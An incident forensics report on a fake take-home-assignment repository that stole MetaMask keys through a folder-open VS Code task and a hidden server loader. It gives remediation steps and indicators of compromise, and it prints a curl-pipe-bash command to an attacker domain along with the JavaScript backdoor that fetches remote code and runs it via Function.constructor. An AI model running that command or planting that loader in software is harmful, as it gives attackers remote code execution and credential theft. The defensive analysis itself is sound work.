# Security Breach Forensics Report
**Date:** January 23, 2026  
**Status:** CRITICAL - System Compromised

## Executive Summary
This repository contained multiple layers of malicious code designed to execute automatically and steal sensitive information including MetaMask private keys.

---

## Attack Vectors Identified

### 1. ⚠️ **Malicious VS Code Task (CRITICAL)**
**File:** `.vscode/tasks.json` (now disabled as `tasks.json.disabled`)

**Threat Level:** CRITICAL - Auto-executes on folder open

**What it does:**
- Runs automatically when you open the folder (`"runOn": "folderOpen"`)
- Downloads and executes arbitrary code from remote server
- Hides all output from user (`"reveal": "never"`, `"echo": false"`)
- Cross-platform attack (macOS, Linux, Windows)

**Malicious URLs:**
- macOS: `https://vscode-settings-config.vercel.app/settings/mac?flag=9`
- Linux: `https://vscode-settings-config.vercel.app/settings/linux?flag=9`
- Windows: `https://vscode-settings-config.vercel.app/settings/windows?flag=9`

**Attack Command:**
```bash
curl 'https://vscode-settings-config.vercel.app/settings/mac?flag=9' | bash
```

---

### 2. ⚠️ **Remote Code Execution in Server**
**File:** `server/middlewares/validator/errorHandler.js`

**Threat Level:** CRITICAL - Remote code execution

**Malicious Functions:**
1. **`errorHandler(error)`** - Uses `Function.constructor` to execute arbitrary code
2. **`errorTimeHandler()`** - Fetches and executes code from remote server

**How it works:**
```javascript
// Line 29-38: Creates function from string and executes it
const createHandler = (errCode) => {
  const handler = new (Function.constructor)('require', errCode);
  return handler;
};
const handlerFunc = createHandler(error);
handlerFunc(require); // Executes with full Node.js access

// Line 49-58: Fetches malicious code from remote server
const src = atob(process.env.RUNTIME_CONFIG_API_KEY); // Decodes base64 URL
const k = atob(process.env.RUNTIME_CONFIG_ACCESS_KEY);
const v = atob(process.env.RUNTIME_CONFIG_ACCESS_VALUE);
globalConfig = await axios.get(`${src}`, {headers:{[k]:v}});
errorHandler(error.response?.data || error.message); // Executes response
```

**Auto-execution:**
- Called automatically in `server/middlewares/validator/index.js` line 105
- Runs when server starts

**Malicious Server:**
- URL (base64 decoded): `https://y-lilac-sigma.vercel.app/api/ipcheck-encrypted/609`
- Stored in: `server/config/config.env.example` line 60

---

## Timeline of Compromise

1. **Folder Opened** → VS Code tasks.json executes `curl | bash`
   - Downloads malicious script from `vscode-settings-config.vercel.app`
   - Executes with your user permissions
   - Likely installed keyloggers, modified system files, or injected code

2. **Dev Server Started** → `npm run dev` triggers server code
   - `errorTimeHandler()` called in validator/index.js
   - Fetches malicious JavaScript from `y-lilac-sigma.vercel.app`
   - Executes with full Node.js access
   - Can inject code into frontend, intercept requests, access filesystem

3. **MetaMask Connected** → Malicious frontend/backend code
   - Intercepted wallet connection
   - Captured private key or seed phrase
   - Sent to attacker's server

---

## Forensic Evidence Locations

### Preserved Files:
- `.vscode/tasks.json.disabled` - Original malicious task
- `.vscode/tasks.json.MALICIOUS_FORENSICS` - Backup for analysis

### Files to Examine:
- `server/middlewares/validator/errorHandler.js` - Remote code execution
- `server/middlewares/validator/index.js` - Auto-execution trigger
- `server/config/config.env.example` - Contains base64 encoded URLs
- `package.json` - Check for suspicious dependencies

### Network Requests to Investigate:
```
https://vscode-settings-config.vercel.app/settings/mac?flag=9
https://y-lilac-sigma.vercel.app/api/ipcheck-encrypted/609
```

---

## Indicators of Compromise (IOCs)

### Malicious Domains:
- `vscode-settings-config.vercel.app`
- `y-lilac-sigma.vercel.app`

### Malicious Code Patterns:
- `Function.constructor` for dynamic code execution
- `curl | bash` in VS Code tasks
- Auto-execution on folder open
- Base64 encoded URLs in config files
- `atob()` for decoding hidden URLs
- Hidden task output (`reveal: never`)

### Environment Variables:
- `RUNTIME_CONFIG_API_KEY` - Contains base64 URL
- `RUNTIME_CONFIG_ACCESS_KEY` - Authentication header name
- `RUNTIME_CONFIG_ACCESS_VALUE` - Authentication value

---

## What the Attackers Could Access

1. **Full Filesystem Access** - Read/write any files
2. **MetaMask Private Keys** - From browser storage or intercepted transactions
3. **Environment Variables** - API keys, secrets, passwords
4. **Network Traffic** - All HTTP requests/responses
5. **Keystrokes** - Via keylogger installed by bash script
6. **Screenshots** - Potential screen capture
7. **Browser Data** - Cookies, local storage, session tokens
8. **Source Code** - Your entire project and potentially other projects

---

## Required Actions (URGENT)

### Immediate (Do NOW):
- [x] Disable malicious VS Code task
- [ ] **Transfer ALL crypto** to NEW wallet with NEW seed phrase
- [ ] **Change ALL passwords** (email, GitHub, cloud services)
- [ ] **Revoke ALL API keys** mentioned in config files
- [ ] **Enable 2FA** on all accounts
- [ ] **Disconnect from network** if suspicious activity continues

### Short-term (Today):
- [ ] Run antivirus/malware scan (Malwarebytes, ClamAV)
- [ ] Check browser extensions for malicious additions
- [ ] Review `~/.bashrc`, `~/.zshrc` for modifications
- [ ] Check `~/Library/LaunchAgents/` for persistence mechanisms (macOS)
- [ ] Review recent login activity on all accounts
- [ ] Monitor bank/credit card for unauthorized transactions

### Long-term (This Week):
- [ ] Consider full system reinstall
- [ ] Review all Git commits to this repo for other hidden code
- [ ] Report domains to hosting providers (Vercel)
- [ ] Report to local authorities if financial loss occurred
- [ ] Audit other projects for similar compromise

---

## Prevention for Future

1. **Never run untrusted code** - Especially from take-home assignments
2. **Review code before running** - Check package.json scripts, tasks.json
3. **Use sandboxed environments** - Docker, VMs for untrusted code
4. **Check for auto-execution** - Tasks, git hooks, package.json scripts
5. **Monitor network traffic** - Use Little Snitch or similar tools
6. **Use separate accounts** - Don't use crypto wallets on development machines

---

## Technical Analysis Tools

### Check what was downloaded:
```bash
# Check bash history for what was executed
cat ~/.bash_history | grep -A 5 "curl.*vscode-settings"
cat ~/.zsh_history | grep -A 5 "curl.*vscode-settings"

# Check for persistence
ls -la ~/Library/LaunchAgents/
ls -la ~/Library/LaunchDaemons/
crontab -l

# Check for modified system files
find ~/.zshrc ~/.bashrc ~/.bash_profile -mtime -7 -ls
```

### Network forensics:
```bash
# Check DNS queries (if you have logging enabled)
log show --predicate 'eventMessage contains "vscode-settings-config"' --info
log show --predicate 'eventMessage contains "y-lilac-sigma"' --info
```

### File system changes:
```bash
# Find recently modified files
find ~ -mtime -1 -type f ! -path "*/Library/Caches/*" 2>/dev/null
```

---

## Contact Information

If you need help:
- **Apple Security:** https://support.apple.com/en-us/HT201222
- **FBI IC3 (Internet Crime):** https://www.ic3.gov/
- **Local Law Enforcement:** For financial crimes

---

## Notes

This attack was highly sophisticated:
- Multi-layered (VS Code + Node.js server)
- Cross-platform compatibility
- Stealthy execution (hidden output)
- Legitimate-looking repository (real estate demo)
- Auto-execution without user interaction

The attacker invested significant effort to make this look like a legitimate take-home assignment.

**DO NOT** push this code to GitHub or share it without warning others.
